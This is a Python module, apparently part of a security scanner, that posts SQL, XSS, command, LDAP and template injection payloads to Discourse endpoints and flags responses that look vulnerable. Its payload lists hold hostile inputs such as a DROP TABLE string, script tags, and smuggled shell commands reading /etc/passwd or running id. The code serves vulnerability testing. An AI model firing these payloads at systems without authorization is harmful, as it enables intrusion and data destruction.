#!/usr/bin/env python3
"""
Injection Testing Module

Tests for various injection vulnerabilities in Discourse.
"""

import requests
from typing import Dict, List, Optional, Any
from colorama import Fore, Style
from urllib.parse import urljoin
import json


class InjectionTester:
    """Tests for injection vulnerabilities"""
    
    def __init__(self, target_url: str, session: Optional[requests.Session] = None,
                 verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.session = session or requests.Session()
        self.verbose = verbose
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "{{7*7}}"
        ]
        self.command_payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& cat /etc/passwd",
            "; ping -c 1 127.0.0.1"
        ]
    
    def test_all_injections(self) -> Dict[str, Any]:
        """Test all injection types"""
        results = {
            'sql_injection': self.test_sql_injection(),
            'xss_injection': self.test_xss_injection(),
            'command_injection': self.test_command_injection(),
            'ldap_injection': self.test_ldap_injection(),
            'template_injection': self.test_template_injection()
        }
        
        return results
    
    def test_sql_injection(self) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing SQL injection...{Style.RESET_ALL}")
        
        test_endpoints = [
            '/session',
            '/users.json',
            '/search.json',
            '/categories.json'
        ]
        
        vulnerabilities = []
        
        for endpoint in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            for payload in self.sql_payloads:
                try:
                    # Test in different parameters
                    test_data = {
                        'login': payload,
                        'password': payload,
                        'q': payload,
                        'username': payload
                    }
                    
                    response = self.session.post(url, json=test_data, timeout=10)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        'sql syntax',
                        'mysql_fetch',
                        'postgresql',
                        'ora-',
                        'sqlite',
                        'syntax error'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                'endpoint': endpoint,
                                'payload': payload,
                                'indicator': indicator,
                                'severity': 'HIGH'
                            })
                            break
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Error testing SQL injection: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_xss_injection(self) -> Dict[str, Any]:
        """Test for XSS vulnerabilities"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing XSS injection...{Style.RESET_ALL}")
        
        test_endpoints = [
            '/posts.json',
            '/topics.json',
            '/search.json'
        ]
        
        vulnerabilities = []
        
        for endpoint in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            for payload in self.xss_payloads:
                try:
                    test_data = {
                        'title': payload,
                        'raw': payload,
                        'q': payload,
                        'content': payload
                    }
                    
                    response = self.session.post(url, json=test_data, timeout=10)
                    
                    # Check if payload is reflected without encoding
                    if payload in response.text and response.headers.get('content-type', '').startswith('text/html'):
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'type': 'reflected_xss',
                            'severity': 'HIGH'
                        })
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Error testing XSS: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_command_injection(self) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing command injection...{Style.RESET_ALL}")
        
        test_endpoints = [
            '/admin/backups.json',
            '/admin/logs.json',
            '/uploads.json'
        ]
        
        vulnerabilities = []
        
        for endpoint in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            for payload in self.command_payloads:
                try:
                    test_data = {
                        'filename': payload,
                        'path': payload,
                        'command': payload
                    }
                    
                    response = self.session.post(url, json=test_data, timeout=10)
                    
                    # Check for command execution indicators
                    command_indicators = [
                        'root:',
                        'bin/bash',
                        'uid=',
                        'gid=',
                        'total ',
                        'drwx'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in command_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                'endpoint': endpoint,
                                'payload': payload,
                                'indicator': indicator,
                                'severity': 'CRITICAL'
                            })
                            break
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Error testing command injection: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_ldap_injection(self) -> Dict[str, Any]:
        """Test for LDAP injection vulnerabilities"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing LDAP injection...{Style.RESET_ALL}")
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*)",
            "*))%00",
            "*()|%26'",
            "*)(objectClass=*"
        ]
        
        vulnerabilities = []
        endpoint = '/session'
        url = urljoin(self.target_url, endpoint)
        
        for payload in ldap_payloads:
            try:
                test_data = {
                    'login': payload,
                    'password': 'test'
                }
                
                response = self.session.post(url, json=test_data, timeout=10)
                
                # Check for LDAP error indicators
                ldap_indicators = [
                    'ldap',
                    'invalid dn syntax',
                    'bad search filter',
                    'protocol error'
                ]
                
                response_text = response.text.lower()
                for indicator in ldap_indicators:
                    if indicator in response_text:
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'indicator': indicator,
                            'severity': 'HIGH'
                        })
                        break
            
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error testing LDAP injection: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    def test_template_injection(self) -> Dict[str, Any]:
        """Test for template injection vulnerabilities"""
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing template injection...{Style.RESET_ALL}")
        
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%=7*7%>",
            "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ]
        
        vulnerabilities = []
        test_endpoints = ['/posts.json', '/topics.json']
        
        for endpoint in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            for payload in template_payloads:
                try:
                    test_data = {
                        'title': payload,
                        'raw': payload
                    }
                    
                    response = self.session.post(url, json=test_data, timeout=10)
                    
                    # Check if template was executed (49 is 7*7)
                    if '49' in response.text or 'config' in response.text.lower():
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Error testing template injection: {e}{Style.RESET_ALL}")
        
        return {
            'tested': True,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }